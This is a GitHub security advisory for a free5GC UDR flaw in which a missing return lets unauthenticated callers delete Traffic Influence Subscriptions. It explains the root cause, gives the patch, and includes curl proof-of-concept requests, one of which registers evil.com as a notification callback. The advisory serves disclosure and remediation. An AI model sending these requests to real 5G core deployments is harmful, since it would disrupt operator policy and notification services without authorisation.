# [H] free5gc UDR improper path validation allows unauthenticated deletion of Traffic Influence Subscriptions

## Summary
Severity: High
Advisory: GHSA-g9cw-qwhf-24jp
CVE: CVE-2026-40246
CWE: CWE-285
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-g9cw-qwhf-24jp
Type: github-advisory

## Affected
- Go: `github.com/free5gc/udr` — affected >=0

## Details
### Summary
An improper path validation vulnerability in the UDR service allows any unauthenticated attacker with access to the 5G Service Based Interface (SBI) to delete Traffic Influence Subscriptions by supplying an arbitrary value in place of the expected `subs-to-notify` path segment.

### Details
The endpoint `DELETE /nudr-dr/v2/application-data/influenceData/{influenceId}/{subscriptionId}` is intended to only operate on Traffic Influence Subscription resources when `influenceId` is exactly `subs-to-notify`.

In the free5GC UDR implementation, the path validation is present but ineffective because the handler does not return after sending the HTTP 404 response. The request handling flow is:

1. The function `HandleApplicationDataInfluenceDataSubsToNotifySubscriptionIdDelete` in `./free5gc_4-2-1/free5gc/NFs/udr/internal/sbi/api_datarepository.go` checks whether `influenceId != "subs-to-notify"`.
2. If the value is different, it calls `c.String(http.StatusNotFound, "404 page not found")`, **but it does not return afterwards**.
3. Execution continues and the handler still calls `s.Processor().ApplicationDataInfluenceDataSubsToNotifySubscriptionIdDeleteProcedure(c, subscriptionId)`.
4. The processor deletes the subscription identified by `subscriptionId` even though the path is invalid and the request should have been rejected.

As a result, an attacker can send a request to an invalid path, receive an apparent `404 page not found` response, and still successfully delete the target subscription.

The missing `return` after sending the 404 response in `api_datarepository.go` is the root cause of this vulnerability.

### PoC
No authentication is required. Only a valid `subscriptionId` is needed.

```bash
# Create a subscription to obtain a valid subscriptionId
curl -v -X POST "http://<udr-host>/nudr-dr/v2/application-data/influenceData/subs-to-notify" \
  -H "Content-Type: application/json" \
  -d '{
    "notificationUri":"http://evil.com/notify",
    "dnns":["internet"],
    "supis":["imsi-222777483957498"]
  }'
```
Example response:
```
HTTP/1.1 201 Created
```

Then delete it through an invalid path:
```bash
curl -v -X DELETE "http://<udr-host>/nudr-dr/v2/application-data/influenceData/WRONGID/87615e16"
```
Response:
```
HTTP/1.1 404 Not Found
404 page not found
```
Now verify that the subscription was actually deleted:
```bash
curl -v "http://<udr-host>/nudr-dr/v2/application-data/influenceData/subs-to-notify/87615e16"
```
Response:
```json
{"title":"User not found","status":404,"cause":"USER_NOT_FOUND"}
```
### Impact
This is an unauthenticated unauthorized delete vulnerability. Any attacker with network access to the SBI can delete Traffic Influence Subscriptions by knowing or guessing a valid subscriptionId.

This can disrupt policy-related notification workflows and remove active subscription state from the UDR. In addition, the attack is harder to detect because the API returns a misleading 404 Not Found response even when the deletion is actually performed.

Impacted deployments: any free5GC instance where the SBI is reachable by untrusted parties (e.g., misconfigured network segmentation, rogue NF, or compromised internal host).

### Patch
The vulnerability has been confirmed patched by adding the missing return
statement in NFs/udr/internal/sbi/api_datarepository.go,
function HandleApplicationDataInfluenceDataSubsToNotifySubscriptionIdDelete:
```go
if influenceId != "subs-to-notify" {
    c.String(http.StatusNotFound, "404 page not found")
    return
}
```
With the patch applied, requests using an invalid influenceId now correctly
return HTTP 404 and do not delete the targeted subscription.

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-g9cw-qwhf-24jp
- https://nvd.nist.gov/vuln/detail/CVE-2026-40246
- https://github.com/free5gc/udr
